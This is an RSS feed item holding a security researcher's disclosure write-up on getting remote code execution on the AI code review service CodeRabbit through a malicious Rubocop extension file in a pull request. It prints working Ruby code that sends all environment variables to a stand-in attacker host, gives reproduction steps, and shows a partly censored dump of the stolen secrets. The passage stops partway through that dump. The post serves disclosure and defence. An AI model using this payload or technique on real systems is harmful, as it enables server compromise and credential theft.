<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 19 Aug 2025 19:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[How we exploited CodeRabbit: From simple PR to RCE and write access on 1M repos (229 pts)]]></title>
            <link>https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/</link>
            <guid>44953032</guid>
            <pubDate>Tue, 19 Aug 2025 15:55:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/">https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/</a>, See on <a href="https://news.ycombinator.com/item?id=44953032">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

		
<p>In this blog post, we explain how we got remote code execution (RCE) on CodeRabbit’s production servers, leaked their API tokens and secrets, how we could have accessed their PostgreSQL database, and how we obtained read and write access to 1 million code repositories, including private ones.</p>



<p>This blog post is a detailed write-up of one of the vulnerabilities we disclosed at <a href="https://research.kudelskisecurity.com/2025/08/07/hack-to-the-future-slides-and-content/">Black Hat USA</a> this year. The details provided in this post are meant to demonstrate how these security issues can manifest and be exploited in the hopes that others can avoid similar issues. This is not meant to shame any particular vendor; it happens to everyone. Security is a process, and avoiding vulnerabilities takes constant vigilance. </p>



<p><strong>Note:</strong> <strong>The security issues documented in this post were remediated in January of 2025.</strong> See the Responsible Disclosure section for more details. </p>



<h2>Introduction</h2>



<p>Last December, I spoke at 38C3 in Hamburg and <a href="https://research.kudelskisecurity.com/2024/08/29/careful-where-you-code-multiple-vulnerabilities-in-ai-powered-pr-agent/">covered 2 security flaws</a> I discovered in Qodo Merge. After getting off the stage, someone came to me and asked whether I had looked at other AI code review tools, such as CodeRabbit. I thanked them and said this would be a great target to have a look at. Fast forward a couple of weeks, and here I am, having a look at their security.</p>



<h2>What is CodeRabbit?</h2>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png"><img data-attachment-id="20091" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-17-144947_2338x669_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png" data-orig-size="2338,669" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-17-144947_2338x669_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=840" width="1024" height="293" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=1024" alt=""></a><figcaption>CodeRabbit front page</figcaption></figure>



<p><a href="https://www.coderabbit.ai/">CodeRabbit</a> is an AI code review tool. Their website mentions it’s the most installed <a href="https://github.com/marketplace?type=apps&amp;category=ai-assisted">AI app on GitHub</a> &amp; Gitlab, with 1 million repositories in review and 5 million pull requests reviewed.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png"><img data-attachment-id="20093" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-17-145000_3457x598_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png" data-orig-size="3457,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-17-145000_3457x598_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=840" width="1024" height="177" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=1024" alt=""></a><figcaption>1 million repositories in review</figcaption></figure>



<p>Indeed, CodeRabbit is the most installed GitHub app in the AI Assisted category on GitHub Marketplace. It is also on the first page of the most installed GitHub apps overall across all categories on <a href="https://github.com/marketplace?type=apps">GitHub Marketplace</a>.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png"><img data-attachment-id="20810" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250721_14h36m44s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png" data-orig-size="3315,1526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250721_14h36m44s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=840" loading="lazy" width="1024" height="471" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit is the most installed AI-assisted app on GitHub marketplace</figcaption></figure>



<p>Once CodeRabbit is installed on a repository, every time a new pull request (PR) is created or updated, CodeRabbit will analyze the code changes in the PR and review them using AI. CodeRabbit will finally post its code review as a comment on the pull request, where the developer can read it.</p>



<p>This is a very useful developer productivity tool that can summarize PRs, find security issues in the code, suggest code improvements or even document the code or illustrate it by generating diagrams. It can save developers a lot of time.</p>



<h2>Trying out CodeRabbit</h2>



<p>CodeRabbit has multiple pricing plans, and one of them is called Pro. That one includes support for linters and SAST tools, such as Semgrep. Alternatively, there’s a free 14-day trial for the Pro plan. Also, the Pro plan comes for free for people working on open source projects.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png"><img data-attachment-id="20096" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-22-142418_1445x846_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png" data-orig-size="1445,846" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-22-142418_1445x846_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=840" loading="lazy" width="1024" height="599" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=1024" alt=""></a><figcaption>CodeRabbit pricing</figcaption></figure>



<p>I registered for the free trial and logged in using my GitHub account.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png"><img data-attachment-id="20116" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-21-100901_1363x1123_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png" data-orig-size="1363,1123" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-21-100901_1363x1123_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=840" loading="lazy" width="1024" height="843" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=1024" alt=""></a><figcaption>Login with GitHub</figcaption></figure></div>


<p>When first logging into CodeRabbit using GitHub, the application asks to install and authorize on a personal GitHub account. The user is asked to select which repositories CodeRabbit should be installed to. The user can also review the permissions that the CodeRabbit GitHub app will be granted. Namely, read and write access to code in the selected repositories.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png"><img data-attachment-id="20100" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-16-154845_655x833_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png" data-orig-size="655,833" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-16-154845_655x833_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=236" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=655" loading="lazy" width="655" height="833" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=655" alt=""></a><figcaption>Installing CodeRabbit on a personal GitHub account</figcaption></figure></div>


<p>At this point, this sounded very similar to what happened with Qodo Merge. I had to look into it. If somehow we could leak the GitHub API token, we would get read and write access to the repository in which CodeRabbit was installed.</p>



<p>I immediately created a private GitHub repository on my personal GitHub account and granted CodeRabbit access to that new repository so that it starts reviewing my PRs on that repo.</p>



<p>In order to get more familiar with CodeRabbit’s features and how to use them, I created a PR and saw that a comment containing a code review was posted by the CodeRabbit bot. Here are a few screenshots of what CodeRabbit generated.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png"><img data-attachment-id="20819" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h02m19s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png" data-orig-size="1270,462" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h02m19s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=840" loading="lazy" width="1024" height="372" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit explains what the PR does</figcaption></figure>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png"><img data-attachment-id="20823" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h06m52s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png" data-orig-size="1131,799" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h06m52s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=840" loading="lazy" width="1024" height="723" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit can find security issues in your code and suggest improvements</figcaption></figure>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png"><img data-attachment-id="20822" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h02m40s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png" data-orig-size="1119,672" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h02m40s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=840" loading="lazy" width="1024" height="614" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit even generated a diagram that explained how the app worked</figcaption></figure>



<p>Now that I had a better idea of how it worked, I could start looking for vulnerabilities. </p>



<h2>Exploiting external tools</h2>



<p>I had a look at the official CodeRabbit documentation and noticed that CodeRabbit supported running <a href="https://docs.coderabbit.ai/tools/">dozens of static analysis tools</a>. These are the linters and SAST tools mentioned on the CodeRabbit pricing page discussed above.</p>



<p>CodeRabbit runs these tools on your PR changes depending on a few conditions:</p>



<ul>
<li>The tool is enabled in the CodeRabbit configuration</li>



<li>The PR contains large enough changes to trigger a run of such tools. Small changes will be ignored and no tool will run on those</li>



<li>The PR contains files supported by the tool. For example, PHPStan will only run on files with the <code>.php</code> extension</li>
</ul>



<p>Some tools are enabled by default and will run if corresponding files exist. Otherwise, a <code>.coderabbit.yaml</code> file placed in the repository can be used to configure which tools should be enabled. Alternatively, the CodeRabbit web app settings can be used to configure tools.</p>



<p>The documentation page also states that each tool can be configured by providing a path to a configuration file read by the tool. Now we’re talking!</p>



<p>Since CodeRabbit executes these external tools, if any of these tools have a way to inject code, we may be able to run arbitrary code. So I glanced over the list of supported tools and found an interesting target: <a href="https://docs.coderabbit.ai/tools/rubocop">Rubocop</a>, a Ruby static analyzer. The CodeRabbit documentation page for Rubocop states that Rubocop will run on Ruby files (<code>.rb</code>) in the repository. It also says that CodeRabbit will look for a <code>.rubocop.yml</code> file anywhere in the repository and pass it to Rubocop.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png"><img data-attachment-id="20802" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250612_17h56m36s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png" data-orig-size="807,210" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250612_17h56m36s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=807" loading="lazy" width="807" height="210" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=807" alt=""></a><figcaption>Rubocop runs on Ruby files (.rb)<br>Source: CodeRabbit documentation</figcaption></figure></div>

<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png"><img data-attachment-id="20805" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250612_17h31m50s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png" data-orig-size="867,239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250612_17h31m50s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=840" loading="lazy" width="867" height="239" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=867" alt=""></a><figcaption>CodeRabbit looks for Rubocop config files anywhere in the repository and, if found, passes it to Rubocop <br>Source: CodeRabbit documentation</figcaption></figure></div>


<p><br>Looking at Rubocop’s documentation, we see that it supports <a href="https://docs.rubocop.org/rubocop/1.69/extensions.html">extensions</a>. One can use the Rubocop configuration file to specify the path to an extension Ruby file, for example, <code>ext.rb</code>, which will be loaded and executed by Rubocop. To do so, one can include the following snippet in <code>.rubocop.yml</code>:</p>





<p>In <code>ext.rb</code>, we can write arbitrary Ruby code that will be loaded and executed when Rubocop runs. We’ll use 1.2.3.4 as an example IP address that stands in for an attacker-controlled system. For example, the following Ruby script will collect the environment variables and send them to an attacker-controlled server at <code>1.2.3.4</code>:</p>


<div><pre title="">require 'net/http'
require 'uri'
require 'json'

# Collect environment variables
env_vars = ENV.to_h

# Convert environment variables to JSON format
json_data = env_vars.to_json

# Define the URL to send the HTTP POST request
url = URI.parse('http://1.2.3.4/')

begin
  # Create the HTTP POST request
  http = Net::HTTP.new(url.host, url.port)
  request = Net::HTTP::Post.new(url.path)
  request['Content-Type'] = 'application/json'
  request.body = json_data

  # Send the request
  response = http.request(request)
rescue StandardError =&gt; e
  puts "An error occurred: #{e.message}"
end
</pre></div>


<p>Exploiting this is as simple as following these steps:</p>



<ul>
<li>Get a free trial on CodeRabbit and register using a personal GitHub account</li>



<li>Create a private repository and grant CodeRabbit access to it, so that it reviews PRs on that repository</li>



<li>Create a PR that contains the following files:
<ul>
<li>A <code>.rubocop.yml</code> file as shown above</li>



<li>An <code>ext.rb</code> file as shown above</li>



<li>Any other large enough dummy Ruby file so that CodeRabbit triggers the execution of Rubocop and does not skip the file</li>
</ul>
</li>



<li>Wait for CodeRabbit to perform the code review and run our malicious ext.rb file</li>



<li>Collect the exfiltrated environment variables in the HTTP POST request received on our attacker-controlled server at 1.2.3.4</li>
</ul>



<p>Here’s an illustration of our malicious pull request to better understand how it works:</p>



<article>


  <div>

    <!-- main.rb -->
    <div>
      <h3>main.rb</h3>
      <pre><span># Contains dummy </span>
<span># Ruby code so </span>
<span># that Rubocop </span>
<span># gets executed</span>

puts "hello"
      </pre>
    </div>

    <!-- .rubocop.yml -->
    <div>
      <h3>.rubocop.yml</h3>
      <pre><span># Instructs </span>
<span># Rubocop to load </span>
<span># extension in </span>
<span># file ext.rb</span>

require:
  ./ext.rb
      </pre>
    </div>

    <!-- ext.rb -->
    <div>
      <h3>ext.rb</h3>
      <pre><span># Malicious Ruby </span>
<span># code goes here</span>
<span># </span>
<span># Example:</span>
<span># </span>
<span># Send all env vars </span>
<span># to http://1.2.3.4</span>
      </pre>
    </div>

  </div>

  <!-- Legend -->
  <p>
    An illustration of what the malicious pull request looks like
  </p>
</article>



<h2>Unpacking what we found</h2>



<p>After we created our malicious PR, CodeRabbit ran Rubocop on our code, which executed our malicious code and sent its environment variables to our server at 1.2.3.4.</p>



<p>On the server at <code>1.2.3.4</code>, the following JSON payload containing environment variables was received:</p>


<div><pre title="">{
  "ANTHROPIC_API_KEYS": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_FREE": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_OSS": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_PAID": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_TRIAL": "sk-ant-api03-(CENSORED)",
  "APERTURE_AGENT_ADDRESS": "(CENSORED)",
  "APERTURE_AGENT_KEY": "(CENSORED)",
  "AST_GREP_ESSENTIALS": "ast-grep-essentials",
  "AST_GREP_RULES_PATH": "/home/jailuser/ast-grep-rules",
  "AWS_ACCESS_KEY_ID": "",
  "AWS_REGION": "",
  "AWS_SECRET_ACCESS_KEY": "",
  "AZURE_GPT4OMINI_DEPLOYMENT_NAME": "",
  "AZURE_GPT4O_DEPLOYMENT_NAME": "",
  "AZURE_GPT4TURBO_DEPLOYMENT_NAME": "",
  "AZURE_O1MINI_DEPLOYMENT_NAME": "",
  "AZURE_O1_DEPLOYMENT_NAME": "",
  "AZURE_OPENAI_API_KEY": "",
  "AZURE_OPENAI_ENDPOINT": "",
  "AZURE_OPENAI_ORG_ID": "",
  "AZURE_OPENAI_PROJECT_ID": "",
  "BITBUCKET_SERVER_BOT_TOKEN": "",
  "BITBUCKET_SERVER_BOT_USERNAME": "",
  "BITBUCKET_SERVER_URL": "",
  "BITBUCKET_SERVER_WEBHOOK_SECRET": "",
  "BUNDLER_ORIG_BUNDLER_VERSION": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_BUNDLE_BIN_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_BUNDLE_GEMFILE": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_GEM_HOME": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_GEM_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_MANPATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_PATH": "/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "BUNDLER_ORIG_RB_USER_INSTALL": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_RUBYLIB": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_RUBYOPT": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "CI": "true",
  "CLOUD_API_URL": "https://(CENSORED)",
  "CLOUD_RUN_TIMEOUT_SECONDS": "3600",
  "CODEBASE_VERIFICATION": "true",
  "CODERABBIT_API_KEY": "",
  "CODERABBIT_API_URL": "https://(CENSORED)",
  "COURIER_NOTIFICATION_AUTH_TOKEN": "(CENSORED)",
  "COURIER_NOTIFICATION_ID": "(CENSORED)",
  "DB_API_URL": " https://(CENSORED)",
  "ENABLE_APERTURE": "true",
  "ENABLE_DOCSTRINGS": "true",
  "ENABLE_EVAL": "false",
  "ENABLE_LEARNINGS": "",
  "ENABLE_METRICS": "",
  "ENCRYPTION_PASSWORD": "(CENSORED)",
  "ENCRYPTION_SALT": "(CENSORED)",
  "FIREBASE_DB_ID": "",
  "FREE_UPGRADE_UNTIL": "2025-01-15",
  "GH_WEBHOOK_SECRET": "(CENSORED)",
  "GITHUB_APP_CLIENT_ID": "(CENSORED)",
  "GITHUB_APP_CLIENT_SECRET": "(CENSORED)",
  "GITHUB_APP_ID": "(CENSORED)",
  "GITHUB_APP_NAME": "coderabbitai",
  "GITHUB_APP_PEM_FILE": "-----BEGIN RSA PRIVATE KEY-----\n(CENSORED)-\n-----END RSA PRIVATE KEY-----\n",
  "GITHUB_CONCURRENCY": "8",
  "GITHUB_ENV": "",
  "GITHUB_EVENT_NAME": "",
  "GITHUB_TOKEN": "",
  "GITLAB_BOT_TOKEN": "(CENSORED)",
  "GITLAB_CONCURRENCY": "8",
  "GITLAB_WEBHOOK_SECRET": "",
  "HOME": "/root",
  "ISSUE_PROCESSING_BATCH_SIZE": "30",
  "ISSUE_PROCESSING_START_DATE": "2023-06-01",
  "JAILUSER": "jailuser",
  "JAILUSER_HOME_PATH": "/home/jailuser",
  "JIRA_APP_ID": "(CENSORED)",
  "JIRA_APP_SECRET": "(CENSORED)",
  "JIRA_CLIENT_ID": "(CENSORED)",
  "JIRA_DEV_CLIENT_ID": "(CENSORED)",
  "JIRA_DEV_SECRET": "(CENSORED)",
  "JIRA_HOST": "",
  "JIRA_PAT": "",
  "JIRA_SECRET": "(CENSORED)",
  "JIRA_TOKEN_URL": "https://auth.atlassian.com/oauth/token",
  "K_CONFIGURATION": "pr-reviewer-saas",
